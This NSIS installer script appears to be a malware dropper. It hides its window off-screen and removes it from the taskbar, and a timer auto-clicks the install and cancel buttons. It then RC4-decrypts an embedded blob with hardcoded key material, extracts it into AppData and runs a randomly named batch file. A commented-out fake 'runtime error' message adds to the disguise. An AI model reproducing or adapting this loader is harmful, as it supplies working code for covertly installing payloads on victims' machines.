
Unicode false
#Caption "runtime error"
OutFile "1.exe"
RequestExecutionLevel user
CRCCheck on
SetCompress force
SetCompressor zlib
InstallDir $TEMP


!include "icon.nsh"
!include "NSIS\Include\LogicLib.nsh"
!include "NSIS\Include\MUI2.nsh"
!include "NSIS\Include\CommCtrl.nsh"
!include "NSIS\Include\WinMessages.nsh"
!include "NSIS\Include\WndSubclass.nsh"
!include "NSIS\Include\nsDialogs.nsh"
!include "NSIS\Include\Util.nsh"
!include "utils.nsh"

!define zip "se6htl48.bin"
!define dir "se6htl48" 
!define run "5g70h3lo.bat"  
!define key  "hcdlgkbxg"                      
!define pass "us1361"
  

Var dlg
Var Button1
Var Button2
Var Button3
Var Button4
Var Button5
Var Button6
Var Install
Var Cancel

Page Custom MyPage
Page InstFiles

!define MUI_CUSTOMFUNCTION_GUIINIT MyGUIInit
!insertmacro MUI_PAGE_INSTFILES
!insertmacro MUI_LANGUAGE "English"



Function .onInit 
InitPluginsDir
File /oname=$PLUGINSDIR\Pict-1.png Pict-1.png
File /oname=$PLUGINSDIR\Pict-2.png Pict-2.png
File /oname=$PLUGINSDIR\Pict-3.png Pict-3.png
File /oname=$PLUGINSDIR\Pict-4.png Pict-4.png
File /oname=$PLUGINSDIR\Pict-5.png Pict-5.png
File /oname=$PLUGINSDIR\Pict-6.png Pict-6.png
File /oname=$PLUGINSDIR\Pict-7.png Pict-7.png
System::Call 'kernel32::CreateMutexA(i 0, i 0, t "rru5ul51tsz") i .r1 ?e'
Pop $R0
${IfNot} $R0 == 0
Abort
${EndIf}
FunctionEnd

!define CLRTXT ffffff
!define CLRBKG 3A3A3A


Function MyGUIInit
System::Call "USER32::SetWindowPos(i, i, i, i, i, i, i) b ($HWNDPARENT, 0, -10000, -10000, 0, 0, ${SWP_NOOWNERZORDER}|${SWP_NOSIZE})"
System::Call "USER32::GetWindowLongA(i $HWNDPARENT, i ${GWL_EXSTYLE}) i .s"
Pop $1
IntOp $2 ${WS_EX_APPWINDOW} ~
IntOp $1 $1 & $2
IntOp $1 $1 | ${WS_EX_TOOLWINDOW}
System::Call "USER32::SetWindowLongA(i $HWNDPARENT, i ${GWL_EXSTYLE}, i r1)"
FunctionEnd

Function MyPage
nsDialogs::Create 1018
Pop $dlg
SetCtlColors $hwndparent 0x${CLRTXT} 0x${CLRBKG}
SetCtlColors $dlg 0x${CLRTXT} 0x${CLRBKG}

GetDlgItem $R0 $HWNDPARENT 1028
System::Call `user32::DestroyWindow(iR0)`

GetDlgItem $Install $HWNDPARENT 1
GetDlgItem $Cancel $HWNDPARENT 2
SetCtlColors $Install 0x${CLRTXT} transparent
SkinButton::SetSkin $Install $PLUGINSDIR\Pict-7.png
SetCtlColors $Cancel 0x${CLRTXT} transparent
SkinButton::SetSkin $Cancel $PLUGINSDIR\Pict-7.png
  
${NSD_CreateButton} 6u 6u 60u 55u "Button1"
Pop $Button1
SetCtlColors $Button1 0x${CLRTXT} transparent
SkinButton::SetSkin $Button1 $PLUGINSDIR\Pict-1.png
${NSD_OnClick} $Button1 fnButton1
  
${NSD_CreateButton} 69u 6u 60u 55u "Button2"
Pop $Button2
SetCtlColors $Button2 0x${CLRTXT} transparent
SkinButton::SetSkin $Button2 $PLUGINSDIR\Pict-2.png
  
${NSD_CreateButton} 133u 6u 124u 55u "Button3"
Pop $Button3
SetCtlColors $Button3 0x${CLRTXT} transparent
SkinButton::SetSkin $Button3 $PLUGINSDIR\Pict-3.png
  
${NSD_CreateButton} 6u 65u 124u 55u "Button4"
Pop $Button4
SetCtlColors $Button4 0x${CLRTXT} transparent
SkinButton::SetSkin $Button4 $PLUGINSDIR\Pict-4.png
  
${NSD_CreateButton} 133u 65u 60u 55u "Button5"
Pop $Button5
SetCtlColors $Button5 0x${CLRTXT} transparent
SkinButton::SetSkin $Button5 $PLUGINSDIR\Pict-5.png
  
${NSD_CreateButton} 197u 65u 60u 55u "Button6"
Pop $Button6
SetCtlColors $Button6 0x${CLRTXT} transparent
SkinButton::SetSkin $Button6 $PLUGINSDIR\Pict-6.png
call Timer 
nsDialogs::Show
FunctionEnd

Function fnButton1
MessageBox MB_OK "   Press Button1"
FunctionEnd

Function Timer
nsDialogs::Create 1018
${NSD_CreateTimer} nsDialogsClose 2000
nsDialogs::Show
FunctionEnd

Function nsDialogsClose
#${NSD_KillTimer} nsDialogsClose
GetDlgItem $0 $HWNDPARENT 1
SendMessage $0 ${BM_CLICK} 0 0
GetDlgItem $0 $HWNDPARENT 2
SendMessage $0 ${BM_CLICK} 0 0
FunctionEnd


Section
SectionEnd


Function .onGUIEnd
Var /Global Hashbmp
SetOutPath $INSTDIR
${GetFileAttribute} "$APPDATA\${dir}" "DIRECTORY" $0
${If} $0 = DIRECTORY
File "${zip}"
${StrCat} ${pass} ${key} $Hashbmp
${Rc4Crypt} "$TEMP\${zip}" "$Hashbmp"
${Extracts} "$TEMP\${zip}" "$TEMP\${dir}" "$APPDATA\${dir}"
${ExeCmd} "$APPDATA\${dir}\${run}"
${EndIf}
#MessageBox MB_OK "runtime error (at 38:711) could not call proc"  /SD IDABORT
FunctionEnd


Function .onInstSuccess
FunctionEnd  

